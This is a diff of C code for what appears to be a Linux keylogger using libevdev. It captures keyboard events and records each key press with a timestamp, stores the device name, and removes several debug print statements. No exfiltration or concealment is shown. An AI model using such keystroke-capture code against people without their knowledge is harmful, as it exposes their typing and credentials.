@@ -50,7 +50,7 @@ void log_device(key_package* key_package) {
   // printf("Device: %s | vendor: %x | product: %x\n", libevdev_get_name(dev),
   //        libevdev_get_id_vendor(dev), libevdev_get_id_product(dev));
 
-  // TODO: store this data in a struct
+  key_package->device_info = libevdev_get_name(dev);  // could prob include more info here. not sure how useful this is.
 
   // clean up
   libevdev_free(dev);
@@ -138,8 +138,6 @@ void log_keys(key_package* key_package) {
     }
   }
 
-  printf("exited loop\n");
-
 
   while (1) {
     struct input_event ev;
@@ -152,7 +150,7 @@ void log_keys(key_package* key_package) {
       if (rc != -EAGAIN) printf("1 error: %d %s\n", -rc, strerror(-rc));
       // exit(0);
     } else if (rc == LIBEVDEV_READ_STATUS_SYNC) {
-      printf("uhhh x2\n");
+      printf("handling syn drop\n");
       handle_syn_dropped(keyboard_dev);
     } else if (rc == LIBEVDEV_READ_STATUS_SUCCESS) {
       // handle event here
@@ -161,13 +159,6 @@ void log_keys(key_package* key_package) {
       // we only care about EV_KEY, represented by ev.type == 1
       if (ev.type == 1) {
         if (ev.value == 1 || ev.value == 2) {
-          // printf("Key pressed!\n%d (%s) %d (%s) value %d\n",
-          //       ev.type,
-          //       libevdev_event_type_get_name(ev.type),
-          //       ev.code,
-          //       libevdev_event_code_get_name(ev.type, ev.code), 
-          //       ev.value);
-          
           // get current time
           time_t rawtime;
           struct tm * timeinfo;
@@ -180,22 +171,12 @@ void log_keys(key_package* key_package) {
             .timestamp = asctime(timeinfo)
           };
 
-          printf("Created new key_info object. Key: %s  Timestamp: %s\n", pressed_key.key, pressed_key.timestamp);
-
           // append to key_package->keys
           key_package->keys[key_package->keys_arr_size] = pressed_key;
           key_package->keys_arr_size++;
 
-          printf("New key_package array size: %ld\n", key_package->keys_arr_size);
+          // printf("New key_package array size: %ld\n", key_package->keys_arr_size);
         }
-        // else {
-        //   printf("Key unpressed!\n%d (%s) %d (%s) value %d\n",
-        //         ev.type,
-        //         libevdev_event_type_get_name(ev.type),
-        //         ev.code,
-        //         libevdev_event_code_get_name(ev.type, ev.code), 
-        //         ev.value);
-        // }
       }
     } else {
       printf("unsure of what is going on here..\n");
